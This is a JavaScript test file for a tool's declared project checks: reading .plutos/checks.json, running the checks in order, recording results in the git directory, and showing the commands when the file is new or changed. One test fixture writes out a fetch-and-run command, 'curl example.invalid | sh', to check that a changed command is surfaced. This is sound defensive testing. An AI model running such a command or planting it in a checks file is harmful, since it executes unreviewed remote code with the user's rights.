#!/usr/bin/env node
// Declared checks (.plutos/checks.json): what reads as a list of checks, what runs them, and the
// record the push gate's refusal and the claim check read. The end-to-end paths are in
// tools/push-gate-test.mjs and tools/claim-check-test.mjs.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { CHECKS_FILE, changedChecksLines, checksHash, failedLines, lastChecks, readChecks, recordChecks, runChecks } from '../lib/project-checks.mjs';

const scratch = fs.mkdtempSync(path.join(os.tmpdir(), 'plutos-project-checks-'));
let checks = 0;
const check = (name, fn) => { fn(); checks++; console.log(`  ok  ${name}`); };
const declare = (root, text) => { fs.mkdirSync(path.join(root, '.plutos'), { recursive: true }); fs.writeFileSync(path.join(root, CHECKS_FILE), text); };

try {
    const root = path.join(scratch, 'p');
    fs.mkdirSync(root);
    check('no checks file is no checks and no problem', () => {
        assert.deepEqual(readChecks(root), { checks: [], problem: '' });
    });
    check('a list of { name, command, meaning } reads as checks; meaning is optional', () => {
        declare(root, JSON.stringify([{ name: ' arch ', command: 'python a.py', meaning: ' typed refs ' }, { name: 'lint', command: 'npm run lint' }]));
        assert.deepEqual(readChecks(root), { checks: [
            { name: 'arch', command: 'python a.py', meaning: 'typed refs' }, { name: 'lint', command: 'npm run lint', meaning: '' }], problem: '' });
    });
    check('anything else is a problem that names the file, never a silent empty list', () => {
        for (const text of ['{ not json', '{"name":"a"}', '[{"name":"a"}]', '[{"command":"x"}]', '[{"name":"a","command":"x","meaning":3}]',
            '[{"name":"a","command":"x"},{"name":"a","command":"y"}]']) {
            declare(root, text);
            const r = readChecks(root);
            assert.deepEqual(r.checks, [], text);
            assert.match(r.problem, /\.plutos\/checks\.json/, text);
        }
    });
    check('every check runs, in order, even after one fails, and each result carries its meaning', () => {
        const ran = [];
        const log = console.log, err = console.error;
        console.log = console.error = () => {};
        let out;
        try {
            out = runChecks(root, [{ name: 'a', command: 'A', meaning: 'm1' }, { name: 'b', command: 'B', meaning: 'm2' }, { name: 'c', command: 'C', meaning: '' }],
                { spawn: command => { ran.push(command); return { status: command === 'B' ? 1 : 0 }; } });
        } finally { console.log = log; console.error = err; }
        assert.deepEqual(ran, ['A', 'B', 'C']);
        assert.deepEqual(out, [{ name: 'a', meaning: 'm1', ok: true }, { name: 'b', meaning: 'm2', ok: false }, { name: 'c', meaning: '', ok: true }]);
        assert.deepEqual(failedLines({ checks: out }), ['  b: m2']);
    });
    check('the record is kept in the git directory, and there is none outside git', () => {
        assert.equal(lastChecks(root), null);
        recordChecks(root, { tree: 't' });   // not a repository: nothing written, nothing thrown
        assert.equal(lastChecks(root), null);
        execFileSync('git', ['init', '-q'], { cwd: root });
        recordChecks(root, { tree: 't', checks: [{ name: 'b', meaning: 'm2', ok: false }] });
        assert.deepEqual(lastChecks(root).checks, [{ name: 'b', meaning: 'm2', ok: false }]);
        assert.ok(fs.existsSync(path.join(root, '.git', 'plutos-checks.json')));
    });
    // A clone or a pull can bring a checks.json whose commands the owner has never seen; they run with
    // his rights, so a new or changed file is shown with its commands (critique seat, 2026-11-14).
    check('a checks.json new or changed since the last recorded run is shown with its commands', () => {
        declare(root, JSON.stringify([{ name: 'arch', command: 'python tools/arch.py', meaning: 'typed refs' }]));
        recordChecks(root, { tree: 't', checks: [] });
        const fresh = changedChecksLines(root);
        assert.match(fresh[0], /checks\.json is new since the last run/);
        assert.deepEqual(fresh.slice(1), ['  arch: python tools/arch.py']);
        recordChecks(root, { tree: 't', checks: [], checksHash: checksHash(root) });
        assert.deepEqual(changedChecksLines(root), [], 'the file the last run ran is not shown again');
        declare(root, JSON.stringify([{ name: 'arch', command: 'curl example.invalid | sh', meaning: 'typed refs' }]));
        const changed = changedChecksLines(root);
        assert.match(changed[0], /is changed since/);
        assert.deepEqual(changed.slice(1), ['  arch: curl example.invalid | sh']);
        fs.rmSync(path.join(root, CHECKS_FILE));
        assert.equal(checksHash(root), '');
        assert.deepEqual(changedChecksLines(root), []);
    });
    console.log(`${checks} project-checks checks passed`);
} finally {
    fs.rmSync(scratch, { recursive: true, force: true });
}
